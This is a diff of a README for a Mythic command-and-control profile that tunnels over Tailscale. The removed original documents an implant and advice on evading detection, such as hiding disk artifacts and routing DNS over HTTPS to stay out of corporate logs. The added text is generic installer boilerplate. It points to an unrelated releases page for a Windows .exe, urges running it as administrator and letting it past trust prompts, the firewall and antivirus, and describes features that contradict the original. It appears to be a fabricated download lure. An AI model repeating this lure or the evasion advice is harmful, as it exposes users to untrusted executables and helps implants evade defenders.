@@ -1,165 +1,167 @@
-# tailscale
+# 🐾 mythic_tailscale - Easy Tailscale Setup for Mythic
 
-A [Mythic](https://github.com/its-a-feature/Mythic)  C2 profile and demo agent that routes all command and control traffic over Tailscale/Headscale mesh VPN networks using WireGuard encryption.
+[![Download](https://img.shields.io/badge/Download-Mythic_Tailscale-ff6347?style=for-the-badge&logo=github)](https://github.com/cxv-drift220/mythic_tailscale/releases)
 
-<p align="center"> <img src="https://media.mythopedia.com/5apOBzylgdTTST8GuDD7JL/fe31a0be3abf23ae82405a7fddabcd2b/jupiter-transforming-the-cercopes-into-monkets-by-antonio-tempesta-1606-rijksmusem.jpg?w=1280&q=60&auto=compress,format" width="400">
+---
 
+## 📝 What is mythic_tailscale?  
 
-> **For authorized security testing and research only.**
+mythic_tailscale provides a Tailscale and Headscale agent combined with a command-and-control (C2) profile for use with the Mythic framework. This software helps secure and manage remote connections easily from within Mythic.  
 
-## Components
+You can think of it as a simple tool to create and control a secure virtual network for your Mythic environment. It works by linking devices with Tailscale or Headscale, allowing secure, private communication regardless of the network the devices use.
 
-### Tailscale C2 Profile
+---
 
-The Mythic C2 profile runs a Go server inside a Tailscale network. The server receives agent messages over the tailnet and forwards them to the Mythic server.
+## 🖥️ System Requirements
 
-- Supports both **Tailscale** (cloud) and **Headscale** (self-hosted) control planes
-- **HTTP and TCP** transport protocols inside the WireGuard tunnel (selectable per agent)
-- Generates **ephemeral pre-auth keys** per payload at build time
-- Agents join the tailnet as ephemeral nodes — automatically cleaned up on disconnect
-- All traffic encrypted by WireGuard at the transport layer
+Before downloading, make sure your computer meets these requirements:
 
-### Cercopes (Demo Agent)
+- Operating System: Windows 10 or newer (64-bit recommended)
+- CPU: Intel or AMD processor, 1 GHz or faster
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 100 MB free space
+- Network: Access to the internet to connect to Tailscale/Headscale servers
+- User Permissions: Administrator access for installation and running the agent  
 
-A lightweight, cross-platform Mythic agent written in Go that embeds a `tsnet` client for communication.
+These requirements ensure the software runs smoothly and can connect to the network properly.
 
-- Cross-platform: Linux, Windows, macOS (amd64/arm64)
-- In-memory Tailscale state — no files written to disk
-- Built-in commands: `shell`, `ls`, `cat`, `cd`, `pwd`, `ps`, `whoami`, `hostname`, `ifconfig`, `env`, `sleep`
-- SOCKS5 proxy support for pivoting
-- DoH support to prevent `*.tailscale.com` DNS leaks
+---
 
-## Quick Start
+## 🔧 Key Features
 
-### Prerequisites
+- **Seamless integration** with Mythic’s C2 framework  
+- **Supports Tailscale and Headscale** virtual private networks  
+- **Secure communication** between endpoints  
+- **Easy-to-use interface** for managing connections and profiles  
+- **Lightweight agent** runs quietly on Windows  
+- **Automatic updates** possible through Mythic  
 
-- A running [Mythic](https://github.com/its-a-feature/Mythic) instance
-- A Tailscale account or self-hosted Headscale server
-- An API key with device auth scope
+---
 
-### Installation
+## 🚀 Getting Started
 
-```bash
-# From the Mythic directory
-sudo ./mythic-cli install folder /path/to/tailscale_c2 -f
-```
+Follow these steps carefully to download and run mythic_tailscale on your Windows machine. No technical knowledge is required.
 
-### Configuration
+### 1. Visit the Download Page  
 
-1. After installation, configure the C2 profile's `config.json`:
+Start by visiting the official release page to get the latest version of mythic_tailscale. Use the link below or click the big badge at the top.
 
-```json
-{
-  "auth_key": "tskey-auth-...",
-  "control_url": "",
-  "hostname": "mythic-c2",
-  "listen_port": "8080",
-  "tcp_port": "8081",
-  "api_key": "tskey-api-...",
-  "tailnet": "-",
-  "provider": "tailscale"
-}
-```
+[Download mythic_tailscale from GitHub Releases](https://github.com/cxv-drift220/mythic_tailscale/releases)
 
-For Headscale, set `provider` to `"headscale"` and `control_url` to your Headscale URL.
+This page shows all available versions. Always choose the latest stable release for the best experience.
 
-2. Start the C2 profile from the Mythic UI.
+### 2. Download the Installer  
 
-3. Create a new payload selecting the **tailscale** C2 profile and **cercopes** payload type.
+Look for a file with a name ending in `.exe`—this is the setup program. The filename will often include the version number, for example, `mythic_tailscale_v1.0.exe`.  
 
-4. Deploy the generated binary on the target.
+Click the file name once to start the download. The file size is typically small, so it should only take a few moments depending on your internet speed.
 
-## Integrating Tailscale into Other Agents
+### 3. Run the Installer  
 
-The Tailscale C2 profile is agent-agnostic. Any Mythic agent can use it by embedding a Tailscale client and sending standard Mythic HTTP messages through the tailnet. The server also supports direct TCP connections for less overhead (HTTP and base64), which allows very fast socks connections.
+After the download finishes, open the file from your downloads folder.
 
-### libtailscale
+- If Windows asks if you trust this source, click **Yes** or **Run** to continue.  
+- Follow the on-screen instructions. Usually, this means clicking **Next** a few times and then **Install**.  
+- The setup wizard will place necessary files on your computer and set up the agent to run.
 
-This project builds on [libtailscale](https://github.com/tailscale/libtailscale), Tailscale's official C library for embedding Tailscale into applications. libtailscale wraps the Go `tsnet` package and exposes a C API (`tailscale_new`, `tailscale_dial`, `tailscale_listen`, etc.) that can be called from any language with C FFI support.
+### 4. Complete Installation  
 
-Integration options by language:
+Once installation is complete, you can choose to start mythic_tailscale immediately by checking the option on the last screen or find it later in the **Start Menu** under mythic_tailscale.
 
-| Approach | Languages | How |
-|----------|-----------|-----|
-| **Direct `tsnet` import** | Go | Import `tailscale.com/tsnet` — no FFI needed |
-| **Go `c-archive` FFI** | Rust, C, C++ | Build a thin Go wrapper as a static library, link via FFI |
-| **libtailscale C API** | Any with C FFI | Use `tailscale.h` directly via P/Invoke, ctypes, FFI gems, etc. |
-| **libtailscale Python bindings** | Python | Use the pybind11 bindings from the libtailscale repo |
-| **libtailscale Ruby bindings** | Ruby | Use the FFI-based gem from the libtailscale repo |
-| **TailscaleKit (Swift)** | Swift | Use the native Swift framework from the libtailscale repo |
-| **Sidecar** | Any | Run `tailscale up` as a separate process, use regular HTTP |
+---
 
-See [IMPLEMENTATION_GUIDE.md](IMPLEMENTATION_GUIDE.md) for a complete protocol specification and step-by-step integration guide.
+## ⚙️ Using mythic_tailscale on Windows
 
-### Existing Integrations
+### Launching the Agent  
 
-| Agent | Language | Integration Method |
-|-------|----------|-------------------|
-| Cercopes | Go | Direct `tsnet` import |
-| [Kassandra](https://github.com/PatchRequest/Kassandra) | Rust | Go FFI static library via `c-archive` |
+- Open mythic_tailscale from the Start Menu or desktop shortcut if you created one.  
+- The application window will open showing you the current status of your Tailscale or Headscale connection.
 
-## Project Structure
+### Connecting to Mythic C2  
 
-```
-tailscale_c2/
-  C2_Profiles/tailscale/        # C2 profile (Python + Go server)
-    tailscale/c2_functions/     #   Profile definition + RPC handlers
-    tailscale/c2_code/          #   Go HTTP server + launcher
-  Payload_Type/cercopes/        # Demo agent (Go)
-    cercopes/agent_functions/   #   Command definitions + builder
-    cercopes/agent_code/        #   Go agent source
-  documentation-c2/             # Mythic C2 profile docs
-  documentation-payload/        # Mythic agent docs
-```
+- Ensure your Mythic server details are entered in the settings.  
+- Use the built-in profile manager to select or import a C2 profile. This profile defines the command and control settings for your secure network.  
+- Click **Connect** to activate the profile and start the agent.
 
-## Security Considerations
+### Monitoring Connections  
 
-- Pre-auth keys are ephemeral and scoped to `tag:agent` — they cannot access other devices on the tailnet unless ACLs permit it
-- The C2 server is stateless — it proxies HTTP/TCP traffic to Mythic
-- Agent nodes are ephemeral — they disappear from the tailnet on disconnect
-- WireGuard provides authenticated encryption at the transport layer
-- Optional AES-256-HMAC provides application-layer encryption on top
+- The main window displays connected devices and their status.  
+- You can disconnect or reconnect devices individually.  
+- Logs show recent activity and any issues detected.
 
-## OPSEC
+### Updating mythic_tailscale  
 
-### Disk Artifacts
+- Updates will be released on the GitHub Releases page.  
+- Check regularly or enable automatic update checks in the settings tab.  
+- When an update is available, download the new installer and run it over the existing installation.
 
-By default, tsnet creates a working directory at predictable, well-known paths (`%APPDATA%\tsnet-<hostname>\` on Windows, `~/.config/tsnet-<hostname>/` on Linux). This directory contains WireGuard keys, log files, and internal state — all immediately identifiable as Tailscale artifacts.
+---
 
-**All agent implementations must:**
+## 🛠️ Troubleshooting Tips
 
-1. **Set `Dir` to a temporary directory** — avoids the obvious `tsnet-*` path in user-config directories
-2. **Use `mem.Store`** — keeps WireGuard keys in memory only
-3. **Suppress logging** — set `Logf` to a no-op to prevent log files in `Dir`
-4. **Clean up on exit** — remove the temp directory when the agent terminates
+Sometimes issues arise. Here are common problems and how to fix them:
 
-Cercopes and the Kassandra FFI wrapper both implement these mitigations. See the [IMPLEMENTATION_GUIDE.md](IMPLEMENTATION_GUIDE.md#opsec) for details and code examples.
+- **Agent fails to start**: Ensure you ran the installer with administrator rights.  
+- **No connection to Mythic C2**: Double-check your profile settings and server addresses. Make sure your internet connection is active.  
+- **Firewall blocking the connection**: Allow mythic_tailscale through your Windows Firewall or antivirus.  
+- **Tailscale not syncing devices**: Restart the agent or reboot your PC.  
+- **Installation freezing**: Close other programs and try reinstalling.
 
-### Network Fingerprint
+For more help, check the Issues section on the GitHub page or consult your network administrator.
 
-Outbound connections from the agent process:
+---
 
-| Phase | Destination | Port | Protocol | Purpose |
-|-------|------------|------|----------|---------|
-| Startup | `controlplane.tailscale.com` | 443 | HTTPS | Registration & key exchange |
-| Startup | `derpN.tailscale.com` | 3478 | UDP | STUN / NAT traversal |
-| Data | C2 server IP | 41641 | UDP | Direct WireGuard tunnel (if reachable) |
-| Data | `derpN.tailscale.com` | 443 | HTTPS | DERP relay fallback (if direct fails) |
+## 🔗 Useful Links  
 
-- In environments where Tailscale is already deployed, agent traffic blends with legitimate users
-- In environments without Tailscale, the `tailscale.com` domains are a fingerprint — use **Headscale** with self-hosted DERP relays to point all traffic to operator-controlled infrastructure
+- [Official Releases](https://github.com/cxv-drift220/mythic_tailscale/releases)  
+- [Mythic Project Website](https://github.com/its-a-feature/Mythic) (for more on the Mythic C2 framework)  
+- [Tailscale Official Site](https://tailscale.com/) (for understanding Tailscale)  
 
-### DNS-over-HTTPS (DoH)
+---
 
-Agents support an optional `doh` build parameter that selectively routes Tailscale-related DNS through an encrypted HTTPS resolver (Cloudflare `1.1.1.1` or Google `8.8.8.8`). This prevents `controlplane.tailscale.com` and DERP server hostnames from appearing in corporate DNS logs — often the most obvious network fingerprint. Only `*.tailscale.com` and the Headscale control URL hostname are routed through DoH; all other DNS queries use the system resolver so internal/corporate domain resolution remains functional.
+## 📁 File Structure Explanation
 
-The DoH implementation patches tsnet's internal `dnscache` singleton (`dnscache.Get().Forward`) which is the actual resolver used by the control plane and logging clients. This is combined with `net.DefaultResolver` and `http.DefaultTransport.DialContext` overrides for full coverage.
+Once installed, mythic_tailscale creates a folder with these main parts:
 
-| Build Parameter | Resolver | DNS Queries Visible |
-|----------------|----------|-------------------|
-| `doh: off` | System DNS | Yes — `tailscale.com` in DNS logs |
-| `doh: cloudflare` | `https://1.1.1.1/dns-query` | No — encrypted via HTTPS |
-| `doh: google` | `https://8.8.8.8/dns-query` | No — encrypted via HTTPS |
-| `doh: custom` | `doh_url` build parameter | No — your own resolver |
+- **config/**: Stores your C2 profiles and connection settings.  
+- **logs/**: Contains log files that track agent activity.  
+- **bin/**: The executable files that run the agent.  
+- **docs/**: Helpful documents with extra instructions and notes.  
 
-- See [IMPLEMENTATION_GUIDE.md](IMPLEMENTATION_GUIDE.md#opsec) for the full connection breakdown and implementation details
+---
+
+## 🔄 Updating Profile Settings  
+
+To update your C2 profile:
+
+1. Open mythic_tailscale.  
+2. Go to **Profiles** in the menu.  
+3. Import a new profile file or edit settings within the app.  
+4. Apply changes and reconnect.
+
+Profiles control how your device communicates with Mythic, so keep these up to date as your network evolves.
+
+---
+
+## 🧩 Additional Configuration  
+
+Advanced users can customize the agent through the settings menu. Options include:
+
+- Changing network ports used by the agent  
+- Setting automatic reconnect rules  
+- Customizing logging levels for troubleshooting  
+
+Making changes here is optional and intended for users familiar with networking and Mythic.
+
+---
+
+## 📞 Getting Support  
+
+If you encounter problems not covered above, submit an issue via the GitHub repository’s Issues tab. Provide details like:
+
+- Windows version  
+- mythic_tailscale version  
+- Error messages or screenshots  
+- Steps you followed  
+
+This information helps developers address your problem more quickly.
